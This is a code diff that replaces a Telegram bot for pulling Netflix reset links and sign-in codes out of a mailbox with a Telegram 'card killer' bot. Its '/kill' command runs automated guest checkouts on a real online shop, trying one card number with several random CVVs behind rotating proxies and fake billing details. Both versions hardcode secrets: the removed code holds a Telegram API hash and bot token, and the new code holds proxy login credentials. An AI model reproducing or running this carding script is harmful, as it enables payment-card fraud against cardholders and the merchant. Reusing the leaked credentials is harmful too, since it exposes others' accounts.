@@ -1,311 +1,212 @@
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from pyrogram.enums import ParseMode
-from modules.reset import extract_latest_netflix_reset_link
-from modules.signin import extract_latest_netflix_signin_code
-from database import init_db, add_emails, remove_email, get_emails, block_user, unblock_user, is_blocked, update_gmail_credentials, get_gmail_credentials, get_all_users, get_blocked_users
 import os
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
+import re
+import random
+import string
+import time
+import logging
+from telethon import TelegramClient, events
+from telethon.tl.types import InputPeerChat
+import requests as r
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
 
-class HealthCheckHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(b"Bot is alive")
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('bot.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-def start_health_server():
-    server = HTTPServer(("", 8080), HealthCheckHandler)
-    server.serve_forever()
+# Bot configuration
+API_ID = int(os.environ.get("API_ID"))
+API_HASH = os.environ.get("API_HASH")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 
-threading.Thread(target=start_health_server, daemon=True).start()
+# Initialize Telegram client
+client = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-print("The Bot is now active...")
+# Proxy configuration
+proxies = {
+    "http": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/",
+    "https": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/"
+}
 
-API_ID = "19274214"
-API_HASH = "bf87adfbc2c24c66904f3c36f3c0af3a"
-BOT_TOKEN = "7521862287:AAEnZbQv72I6ATVkSWNpBrfQQKBBn7a3ju8"
-ADMIN_ID = "2104057670"
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+]
 
-app = Client("netflix_reset_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+def get_random_user_agent():
+    return random.choice(USER_AGENTS)
 
-init_db()
+def generate_random_email():
+    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    domain = random.choice(domains)
+    return f"{name}@{domain}"
 
-@app.on_message(filters.command("start"))
-async def start_command(client, message):
-    sender_id = message.from_user.id
-    base_welcome = (
-        "**🌟 Welcome to Netflix Reset Bot 🌟**\n\n"
-        "We provide a **professional and efficient** service to help you manage your Netflix account.\n"
-        "Retrieve password reset links and sign-in codes with ease!\n\n"
-        "✨ **User Commands:**\n"
-        "- `/reset <email>` - Get your password reset link\n"
-        "- `/signin <email>` - Get your sign-in code\n"
-        "- `/mymails` - View your whitelisted emails\n\n"
-        "📝 **Note:** All links and codes are valid for emails received within the last hour.\n"
-        "Contact our admin to get whitelisted and start using the bot!"
-    )
-    
-    if sender_id == ADMIN_ID:
-        admin_commands = (
-            "\n\n🔧 **Admin Commands:**\n"
-            "- `/add <user_id> email1 email2 ...` - Add emails to a user\n"
-            "- `/remove <user_id> <email>` - Remove an email from a user\n"
-            "- `/block <user_id>` - Block a user\n"
-            "- `/unblock <user_id>` - Unblock a user\n"
-            "- `/check <user_id>` - Check user's whitelisted emails\n"
-            "- `/stats` - View bot statistics\n"
-            "- `/gmail <email>:<app_password>` - Update Gmail credentials"
+def get_headers():
+    return {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-GB,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Referer': 'https://www.patchstop.com/mens-and-womens-clothing/womens-fashion-tops.html',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': get_random_user_agent(),
+        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+def get_form_key_and_action():
+    try:
+        s = r.Session()
+        headers = get_headers()
+        response = s.get(
+            'https://www.patchstop.com/motorcycle-rally-products/daytona-beach-bike-week/daytona-bike-week-2021/2021-daytona-bike-week-80-years-flaming-pipes-event-patch.html',
+            headers=headers,
+            proxies=proxies,
+            timeout=15
         )
-        welcome_text = base_welcome + admin_commands
-    else:
-        welcome_text = base_welcome
-        
-    await message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        form = soup.find('form', id='product_addtocart_form')
+        action_url = form['action']
+        form_key_match = re.search(r'/form_key/([^/]+)/', action_url)
+        form_key = form_key_match.group(1) if form_key_match else None
+        logger.info("Successfully fetched form key and action URL")
+        return s, form_key, action_url
+    except Exception as e:
+        logger.error(f"Form key fetch failed: {e}")
+        return None, None, None
 
-@app.on_message(filters.command("add") & filters.user(ADMIN_ID))
-async def add_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/add <user_id> email1 email2 ...`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    text = command_parts[1].strip()
-    parts = text.split(maxsplit=1)
-    try:
-        user_id = int(parts[0].strip())
-    except ValueError:
-        await message.reply_text("**Error:** Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    if len(parts) < 2:
-        await message.reply_text("**Error:** Provide at least one email.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    emails_text = parts[1].strip()
-    new_emails = [email.strip() for email in emails_text.split() if '@' in email]
-
-    if not new_emails:
-        await message.reply_text("**Error:** No valid email addresses provided.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    add_emails(user_id, new_emails)
-    email_list = "\n".join([f"- `{email}`" for email in get_emails(user_id)])
-    await message.reply_text(
-        f"**Success:** User ID `{user_id}` updated with:\n{email_list}",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-@app.on_message(filters.command("remove") & filters.user(ADMIN_ID))
-async def remove_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/remove <user_id> <email>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    parts = command_parts[1].split(maxsplit=1)
-    if len(parts) < 2:
-        await message.reply_text("**Error:** Use: `/remove <user_id> <email>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    try:
-        user_id = int(parts[0].strip())
-    except ValueError:
-        await message.reply_text("**Error:** Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    target_email = parts[1].strip()
-    if remove_email(user_id, target_email):
-        email_list = "\n".join([f"- `{email}`" for email in get_emails(user_id)])
-        response_text = f"**Success:** Removed `{target_email}` from User ID `{user_id}`.\nRemaining emails:\n{email_list}" if email_list else f"**Success:** Removed `{target_email}` from User ID `{user_id}`. No emails remain."
-        await message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN)
-    else:
-        await message.reply_text(f"**Error:** Email not found in User ID `{user_id}`'s whitelist.", parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("mymails"))
-async def mymails_command(client, message):
-    sender_id = message.from_user.id
-    if is_blocked(sender_id):
-        await message.reply_text("**Error:** You are blocked from using this bot.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    emails = get_emails(sender_id)
-    if not emails:
-        await message.reply_text("**Error:** You are not whitelisted. Contact the admin.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    email_list = "\n".join([f"- `{email}`" for email in emails])
-    response_text = (
-        f"**Your Whitelisted Emails:**\n"
-        f"Associated with your account (ID: `{sender_id}`):\n"
-        f"{email_list}"
-    )
-    await message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("block") & filters.user(ADMIN_ID))
-async def block_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/block <user_id>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    try:
-        user_id = int(command_parts[1].strip())
-    except ValueError:
-        await message.reply_text("**Error:** Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    block_user(user_id)
-    await message.reply_text(f"**Success:** User ID `{user_id}` has been blocked.", parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("unblock") & filters.user(ADMIN_ID))
-async def unblock_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/unblock <user_id>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    try:
-        user_id = int(command_parts[1].strip())
-    except ValueError:
-        await message.reply_text("**Error:** Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    unblock_user(user_id)
-    await message.reply_text(f"**Success:** User ID `{user_id}` has been unblocked.", parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("check") & filters.user(ADMIN_ID))
-async def check_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/check <user_id>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    try:
-        user_id = int(command_parts[1].strip())
-    except ValueError:
-        await message.reply_text("**Error:** Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    emails = get_emails(user_id)
-    if not emails:
-        await message.reply_text(f"**Info:** User ID `{user_id}` has no whitelisted emails.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    email_list = "\n".join([f"- `{email}`" for email in emails])
-    response_text = (
-        f"**Whitelisted Emails for User ID `{user_id}`:**\n"
-        f"{email_list}"
-    )
-    await message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("stats") & filters.user(ADMIN_ID))
-async def stats_command(client, message):
-    total_users = len(get_all_users())
-    blocked_users = len(get_blocked_users())
-    whitelisted_users = len([user for user in get_all_users() if get_emails(user)])
-
-    stats_text = (
-        "**📊 Bot Statistics 📊**\n\n"
-        f"👥 **Total Users:** `{total_users}`\n"
-        f"✅ **Whitelisted Users:** `{whitelisted_users}`\n"
-        f"🚫 **Blocked Users:** `{blocked_users}`\n"
-        f"📧 **Active Users (not blocked):** `{total_users - blocked_users}`"
-    )
-    await message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("gmail") & filters.user(ADMIN_ID))
-async def gmail_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/gmail <email>:<app_password>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    text = command_parts[1].strip()
-    if ':' not in text:
-        await message.reply_text("**Error:** Invalid format. Use: `/gmail <email>:<app_password>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    email, app_password = text.split(':', 1)
-    update_gmail_credentials(email.strip(), app_password.strip())
-    await message.reply_text(f"**Success:** Gmail credentials updated to `{email}`.", parse_mode=ParseMode.MARKDOWN)
-
-@app.on_message(filters.command("reset"))
-async def reset_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/reset <email>`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    sender_id = message.from_user.id
-    if is_blocked(sender_id):
-        await message.reply_text("**Error:** You are blocked from using this bot.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    target_email = command_parts[1].strip()
+async def process_cvv_single(card_info, cvv, event):
+    cc, mm, yy, _ = card_info.split('|')
+    email = generate_random_email()
+    headers = get_headers()
+    session, form_key, action_url = get_form_key_and_action()
     
-    # Check if the sender is the admin
-    if sender_id != ADMIN_ID:
-        # For non-admin users, check if the email is whitelisted
-        emails = get_emails(sender_id)
-        if not emails or target_email not in emails:
-            await message.reply_text("**Error:** Email not in your whitelist or you’re not authorized.", parse_mode=ParseMode.MARKDOWN)
-            return
+    if not session or not form_key or not action_url:
+        await event.respond(f"{cvv} - Failed to get form key")
+        logger.warning(f"Failed to get form key for CVV: {cvv}")
+        return f"{cvv} - Failed to get form key"
 
-    # If the sender is admin, they can bypass the whitelist check
-    gmail_email, gmail_app_password = get_gmail_credentials()
-    sending_msg = await message.reply_text("**Sending...** Processing your request.", parse_mode=ParseMode.MARKDOWN)
-    reset_link, error_message = extract_latest_netflix_reset_link(gmail_email, gmail_app_password, target_email)
+    try:
+        # Add to cart
+        data = {
+            'form_key': form_key,
+            'product': '20164',
+            'related_product': '',
+            'qty': '1'
+        }
+        session.post(action_url, headers=headers, data=data, proxies=proxies, timeout=15)
+        logger.info(f"Added product to cart for CVV: {cvv}")
 
-    if reset_link:
-        response_text = (
-            f"**Success!** Reset link for `{target_email}`:\n\n"
-            "**Click below to reset your password.**"
-        )
-        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("Reset Password", url=reset_link)]])
-        await sending_msg.edit_text(response_text, reply_markup=buttons, parse_mode=ParseMode.MARKDOWN)
-    else:
-        response_text = f"**Error:** {error_message}"
-        await sending_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
+        # Go to checkout
+        session.get('https://www.patchstop.com/checkout/onepage/', headers=headers, proxies=proxies, timeout=15)
 
-@app.on_message(filters.command("signin"))
-async def signin_command(client, message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) < 2:
-        await message.reply_text("**Error:** Use: `/signin <email>`", parse_mode=ParseMode.MARKDOWN)
+        # Save checkout method
+        session.post('https://www.patchstop.com/checkout/onepage/saveMethod/', headers=headers, data={'method': 'guest'}, proxies=proxies, timeout=15)
+
+        # Save billing info
+        billing = {
+            'billing[address_id]': '',
+            'billing[firstname]': 'Mohammed',
+            'billing[lastname]': 'Nehal',
+            'billing[company]': '',
+            'billing[email]': email,
+            'billing[street][]': ['New York', 'New York'],
+            'billing[city]': 'New York',
+            'billing[region_id]': '43',
+            'billing[postcode]': '10040',
+            'billing[country_id]': 'US',
+            'billing[telephone]': '07975102052',
+            'billing[save_in_address_book]': '1',
+            'billing[use_for_shipping]': '1',
+            'form_key': form_key,
+        }
+        session.post('https://www.patchstop.com/checkout/onepage/saveBilling/', headers=headers, data=billing, proxies=proxies, timeout=15)
+        logger.info(f"Saved billing info for CVV: {cvv}")
+
+        # Save shipping method
+        session.post('https://www.patchstop.com/checkout/onepage/saveShippingMethod/', headers=headers, data={'shipping_method': 'usps_1', 'form_key': form_key}, proxies=proxies, timeout=15)
+
+        # Submit payment and place order
+        data = {
+            'payment[method]': 'authorizenet',
+            'payment[cc_type]': 'VI',
+            'payment[cc_number]': cc,
+            'payment[cc_exp_month]': mm,
+            'payment[cc_exp_year]': yy,
+            'payment[cc_cid]': cvv,
+            'form_key': form_key,
+        }
+        resp = session.post(f'https://www.patchstop.com/checkout/onepage/saveOrder/form_key/{form_key}/', headers=headers, data=data, proxies=proxies, timeout=15)
+
+        try:
+            msg = resp.json().get('error_messages', 'No error message found')
+            await event.respond(f"{cvv} - {msg}")
+            logger.info(f"Processed CVV {cvv}: {msg}")
+            return f"{cvv} - {msg}"
+        except:
+            await event.respond(f"{cvv} - Response parse failed")
+            logger.error(f"Response parse failed for CVV: {cvv}")
+            return f"{cvv} - Response parse failed"
+
+    except Exception as e:
+        await event.respond(f"{cvv} - Exception: {str(e)}")
+        logger.error(f"Exception for CVV {cvv}: {str(e)}")
+        return f"{cvv} - Exception: {str(e)}"
+
+async def process_card(card_info, event):
+    start_time = time.time()
+    logger.info(f"Starting card processing: {card_info}")
+
+    try:
+        _, _, _, real_cvv = card_info.split('|')
+        cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(10)]
+    except ValueError:
+        await event.respond("Invalid card format. Use: cc|mm|yy|cvv")
+        logger.error(f"Invalid card format: {card_info}")
         return
 
-    sender_id = message.from_user.id
-    if is_blocked(sender_id):
-        moving = await message.reply_text("**Error:** You are blocked from using this bot.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    target_email = command_parts[1].strip()
-    
-    # Check if the sender is the admin
-    if sender_id != ADMIN_ID:
-        # For non-admin users, check if the email is whitelisted
-        emails = get_emails(sender_id)
-        if not emails or target_email not in emails:
-            await message.reply_text("**Error:** Email not in your whitelist or you’re not authorized.", parse_mode=ParseMode.MARKDOWN)
-            return
-
-    # If the sender is admin, they can bypass the whitelist check
-    gmail_email, gmail_app_password = get_gmail_credentials()
-    sending_msg = await message.reply_text("**Sending...** Processing your request.", parse_mode=ParseMode.MARKDOWN)
-    signin_code, error_message = extract_latest_netflix_signin_code(gmail_email, gmail_app_password, target_email)
-
-    if signin_code:
-        response_text = (
-            f"**Success!** Sign-in code for `{target_email}`:\n\n"
-            f"**Code:** `{signin_code}`\n"
-            "__Use this code to sign in to Netflix.__"
+    with ThreadPoolExecutor(max_workers=8) as executor:
+        results = await client.loop.run_in_executor(
+            None,
+            lambda: list(executor.map(lambda c: client.loop.run_until_complete(process_cvv_single(card_info, c, event)), cvvs))
         )
-        await sending_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
-    else:
-        response_text = f"**Error:** {error_message}"
-        await sending_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
 
-print("The Bot is now active...")
-app.run()
+    end_time = time.time()
+    total_time = end_time - start_time
+    await event.respond(f"✅ Total time taken: {total_time:.2f} seconds")
+    logger.info(f"Card processing completed in {total_time:.2f} seconds")
+
+@client.on(events.NewMessage(pattern='/kill (.+)'))
+async def handle_kill(event):
+    card_info = event.pattern_match.group(1).strip()
+    logger.info(f"Received /kill command with card: {card_info}")
+    await event.respond("Processing card...")
+    await process_card(card_info, event)
+
+@client.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await event.respond("Bot started! Use /kill cc|mm|yy|cvv to process a card.")
+    logger.info("Bot started by user")
+
+async def main():
+    logger.info("Bot is running...")
+    await client.run_until_disconnected()
+
+if __name__ == '__main__':
+    client.loop.run_until_complete(main())
